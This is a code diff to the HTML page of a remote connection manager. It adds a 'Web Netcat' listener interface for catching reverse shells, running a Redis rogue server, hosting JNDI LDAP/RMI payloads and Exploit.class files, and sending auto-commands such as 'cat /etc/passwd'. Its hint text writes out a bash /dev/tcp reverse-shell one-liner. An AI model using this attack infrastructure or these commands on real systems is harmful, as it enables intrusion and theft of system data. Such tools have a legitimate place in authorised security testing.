@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>远程连接管理器</title>
 <link rel="stylesheet" href="/vendor/xterm/xterm.css">
-<link rel="stylesheet" href="/css/style.css?v=20261117j">
+<link rel="stylesheet" href="/css/style.css?v=20261118b">
 </head>
 <body>
 <div id="app">
@@ -13,6 +13,7 @@
     <h1>远程连接管理器</h1>
     <div class="actions">
       <button id="btn-add" class="btn-primary">+ 新建连接</button>
+      <button id="btn-netcat" class="btn-secondary">网络监听</button>
       <button id="btn-keys" class="btn-secondary">密钥管理</button>
       <button id="btn-about" class="btn-secondary">关于</button>
     </div>
@@ -42,17 +43,18 @@
           <option value="vnc">VNC</option>
           <option value="rdp">RDP</option>
           <option value="telnet">Telnet</option>
+          <option value="netcat">Netcat 监听（Web Netcat）</option>
         </select>
       </div>
-      <div class="form-row">
+      <div class="form-row conn-only">
         <label>主机</label>
         <input type="text" name="host" required placeholder="192.168.1.1">
       </div>
       <div class="form-row">
-        <label>端口</label>
+        <label id="port-label">端口</label>
         <input type="number" name="port" required>
       </div>
-      <div class="form-row">
+      <div class="form-row conn-only">
         <label>用户名</label>
         <input type="text" name="username">
       </div>
@@ -76,11 +78,11 @@
           <input type="password" name="password">
         </div>
       </div>
-      <div class="form-row">
+      <div class="form-row conn-only">
         <label>宽度</label>
         <input type="number" name="width" value="1280">
       </div>
-      <div class="form-row">
+      <div class="form-row conn-only">
         <label>高度</label>
         <input type="number" name="height" value="720">
       </div>
@@ -99,6 +101,53 @@
           <option value="medium" selected>均衡（默认）</option>
           <option value="low">流畅（省带宽，抗卡顿）</option>
         </select>
+      </div>
+
+      <!-- Netcat 监听配置（类型选 Netcat 监听时显示） -->
+      <div id="nc-conn-section" class="hidden">
+        <div class="form-row">
+          <label>监听模式</label>
+          <select name="nc_mode" id="nc-conn-mode" onchange="onConnNcModeChange()">
+            <option value="shell">shell（反弹 shell 终端 + 自动命令集）</option>
+            <option value="raw">raw（特征应答）</option>
+            <option value="redis">redis（Rogue Server，PSYNC/exp.so 投递）</option>
+            <option value="ldap">ldap / jndi（JNDI Reference）</option>
+            <option value="rmi">rmi（JRMI 握手 + 载荷）</option>
+            <option value="http">http（JNDI CodeBase 文件服务）</option>
+          </select>
+        </div>
+        <div class="form-row" id="nc-conn-autocmd-row">
+          <label>自动命令集（连接后自动下发，每行一条）</label>
+          <textarea name="nc_auto_cmds" id="nc-conn-auto-cmds" rows="3" spellcheck="false"
+            placeholder="id&#10;uname -a | 200&#10;cat /etc/passwd @ \$"></textarea>
+          <span class="hint">命令可加 <code>| 300</code> 指定延迟毫秒，或 <code>@ 正则</code> 等输出命中后再发。</span>
+        </div>
+        <div class="form-row nc-conn-ldap hidden" id="nc-conn-ldap">
+          <label>javaCodeBase（JNDI 远程类地址）</label>
+          <input type="text" name="nc_java_code_base" placeholder="http://1.2.3.4:8081/">
+          <label>javaClassName</label>
+          <input type="text" name="nc_java_class_name" value="Exploit">
+        </div>
+        <div class="form-row nc-conn-http hidden" id="nc-conn-http">
+          <label class="nc-check"><input type="checkbox" name="nc_serve_payload_dir" checked> 按请求路径返回 payload 文件（.class / .jar / exp.so）</label>
+          <span class="hint">上传 payload 后，CodeBase 指向本监听的 <code>http://IP:端口/Exploit.class</code>。</span>
+        </div>
+        <div class="form-row nc-conn-rmi hidden" id="nc-conn-rmi">
+          <label>默认 Payload 文件（收到客户端数据后发送）</label>
+          <select name="nc_payload_file" id="nc-conn-payload-file"><option value="">-- 不发送 --</option></select>
+        </div>
+        <div class="form-row">
+          <label class="nc-check"><input type="checkbox" name="nc_auto_start" checked> 保存后立即启动监听</label>
+        </div>
+        <div class="form-row">
+          <div class="nc-conn-rules-head">
+            <label>特征 → Payload 规则</label>
+            <button type="button" class="btn-secondary nc-add-rule"
+              onclick="addNcRule(undefined, document.getElementById('conn-nc-rules'))">+ 添加规则</button>
+          </div>
+          <div id="conn-nc-rules"></div>
+          <span class="hint">命中任一规则即推送对应 payload；多条规则可同时生效。高级参数（banner、javaSerializedData、Referral 等）保存后可在「网络监听 → 编辑」里继续调整。</span>
+        </div>
       </div>
       </div>
       <div class="modal-footer">
@@ -203,6 +252,157 @@
   </div>
 </div>
 
+<!-- Web Netcat：监听列表 + 详情 -->
+<div id="netcat-modal" class="modal hidden">
+  <div class="modal-content nc-modal">
+    <div class="modal-header">
+      <h2>网络监听（Web Netcat）</h2>
+      <div class="about-actions">
+        <button id="nc-payload-btn" class="btn-secondary">Payload 文件</button>
+        <button id="nc-new-btn" class="btn-primary">+ 新建监听</button>
+        <button class="close-btn" onclick="closeNetcatModal()">&times;</button>
+      </div>
+    </div>
+    <div class="nc-wrap">
+      <aside class="nc-list" id="nc-list"></aside>
+      <section class="nc-detail" id="nc-detail">
+        <div class="nc-empty">左侧选一个监听查看会话与事件</div>
+      </section>
+    </div>
+    <div class="modal-footer">
+      <p class="hint" id="nc-hint">监听端口对外开放：反弹 shell 请用 <code>bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/&lt;port&gt; 0&gt;&amp;1</code></p>
+      <button class="btn-secondary" onclick="closeNetcatModal()">关闭</button>
+    </div>
+  </div>
+</div>
+
+<!-- 监听配置表单 -->
+<div id="nc-form-modal" class="modal hidden">
+  <div class="modal-content nc-form-modal">
+    <div class="modal-header">
+      <h2 id="nc-form-title">新建监听</h2>
+      <button class="close-btn" onclick="closeListenerForm()">&times;</button>
+    </div>
+    <form id="nc-form">
+      <input type="hidden" name="id">
+      <div class="modal-body">
+        <div class="nc-grid2">
+          <label>名称<input type="text" name="name" placeholder="反弹 Shell / Redis Rogue"></label>
+          <label>模式
+            <select name="mode" id="nc-mode" onchange="onNcModeChange()">
+              <option value="shell">shell（反弹 shell 终端）</option>
+              <option value="raw">raw（特征应答）</option>
+              <option value="redis">redis（Rogue Server）</option>
+              <option value="ldap">ldap / jndi（JNDI Reference）</option>
+              <option value="rmi">rmi（JRMI 载荷）</option>
+              <option value="http">http（JNDI CodeBase）</option>
+            </select>
+          </label>
+          <label>绑定地址<input type="text" name="bind" value="0.0.0.0"></label>
+          <label>端口<input type="number" name="port" min="1" max="65535" required></label>
+          <label>最大连接数<input type="number" name="max_conns" value="64" min="1"></label>
+          <label>连接后延迟（ms）<input type="number" name="initial_delay_ms" value="0" min="0"></label>
+        </div>
+        <label class="nc-check"><input type="checkbox" name="auto_start" checked> 保存后立即启动（服务重启时自动恢复）</label>
+
+        <div class="nc-grid2">
+          <label>Banner（连接后立即发送，支持 \n）
+            <input type="text" name="banner" placeholder="例如 SSH-2.0-OpenSSH_8.9">
+          </label>
+          <label id="nc-payload-file-row">默认 Payload 文件
+            <select name="payload_file" id="nc-payload-file"><option value="">-- 不发送 --</option></select>
+          </label>
+        </div>
+
+        <div class="nc-section" id="nc-autocmd-section">
+          <h3>自动命令集（shell 模式）</h3>
+          <p class="hint">每行一条：<code>命令</code>，可加 <code>| 300</code> 指定延迟毫秒，或 <code>@ 正则</code> 等输出命中后再发。命令会自动补换行。</p>
+          <textarea name="auto_cmds" id="nc-auto-cmds" rows="4" spellcheck="false"
+            placeholder="id&#10;uname -a | 200&#10;cat /etc/passwd @ \$&#10;whoami"></textarea>
+        </div>
+
+        <div class="nc-section nc-mode-ldap hidden">
+          <h3>LDAP / JNDI 参数</h3>
+          <div class="nc-grid2">
+            <label>javaClassName<input type="text" name="java_class_name" value="Exploit"></label>
+            <label>javaFactory<input type="text" name="java_factory" value="Exploit"></label>
+            <label>javaCodeBase<input type="text" name="java_code_base" placeholder="http://1.2.3.4:8080/"></label>
+            <label>javaReferenceAddress<input type="text" name="jndi_ref_address" placeholder="#0#0#可选"></label>
+          </div>
+          <label>javaSerializedData（base64，可选：直接下序列化 gadget）
+            <textarea name="java_serialized_payload" rows="3" spellcheck="false"></textarea>
+          </label>
+          <label>Referral（可选：返回 resultCode 10，让客户端改连，如 ldap://1.2.3.4:1389/Exploit）
+            <input type="text" name="ldap_referral">
+          </label>
+        </div>
+
+        <div class="nc-section nc-mode-http hidden">
+          <h3>HTTP CodeBase</h3>
+          <div class="nc-grid2">
+            <label>状态码<input type="number" name="http_status" value="200"></label>
+            <label>Content-Type<input type="text" name="http_content_type" placeholder="application/java-vm"></label>
+          </div>
+          <label class="nc-check"><input type="checkbox" name="serve_payload_dir" checked> 按请求路径返回 payload 文件（Exploit.class / gadget.jar / exp.so）</label>
+          <label>固定响应体（路径不命中时使用）
+            <textarea name="http_body" rows="2" spellcheck="false"></textarea>
+          </label>
+        </div>
+
+        <div class="nc-section nc-mode-rmi hidden">
+          <h3>RMI 载荷</h3>
+          <p class="hint">连接后先回 JRMI 头，收到客户端数据再发送这里的原始字节（base64）；也可用上面的「默认 Payload 文件」。</p>
+          <label>Payload（base64）
+            <textarea name="payload" rows="3" spellcheck="false"></textarea>
+          </label>
+        </div>
+
+        <div class="nc-section">
+          <h3>特征 → Payload 规则 <button type="button" class="btn-secondary nc-add-rule" onclick="addNcRule()">+ 添加规则</button></h3>
+          <p class="hint">命中任一规则即推送对应 payload；窗口 4KB，命中后清空窗口，同一段数据不重复触发。多条规则可同时生效。</p>
+          <div id="nc-rules"></div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn-secondary" onclick="closeListenerForm()">取消</button>
+        <button type="submit" class="btn-primary">保存</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<!-- Payload 文件管理 -->
+<div id="nc-payload-modal" class="modal hidden">
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2>Payload 文件</h2>
+      <button class="close-btn" onclick="closePayloadModal()">&times;</button>
+    </div>
+    <div class="keys-toolbar">
+      <input type="file" id="nc-payload-input">
+      <button class="btn-primary" onclick="uploadNcPayload()">上传</button>
+    </div>
+    <p class="hint" style="padding: 0 20px">exp.so / Exploit.class / gadget.jar 等二进制放这里，规则与 HTTP 模式按文件名引用。</p>
+    <div id="nc-payload-list" class="keys-list"></div>
+  </div>
+</div>
+
+<!-- 浏览器里的 nc 终端 -->
+<div id="nc-term" class="nc-term hidden">
+  <div class="nc-term-head">
+    <span id="nc-term-title">终端</span>
+    <div class="nc-term-actions">
+      <button id="nc-term-kill" class="danger" title="断开会话">断开会话</button>
+      <button id="nc-term-close" title="关闭终端（会话保持）">关闭终端</button>
+    </div>
+  </div>
+  <div id="nc-term-body"></div>
+  <div class="nc-term-input">
+    <input id="nc-term-cmd" placeholder="输入命令后回车发送（也可直接在终端里输入）" spellcheck="false" autocomplete="off">
+    <button id="nc-term-send" class="btn-primary">发送</button>
+  </div>
+</div>
+
 <!-- Session Viewer -->
 <div id="session-viewer" class="session-viewer hidden">
   <div class="session-header">
@@ -254,6 +454,6 @@
   window.Guacamole = Guacamole;
 </script>
 <script src="/js/footer.js?v=20261117a"></script>
-<script src="/js/app.js?v=20261117l"></script>
+<script src="/js/app.js?v=20261118b"></script>
 </body>
 </html>
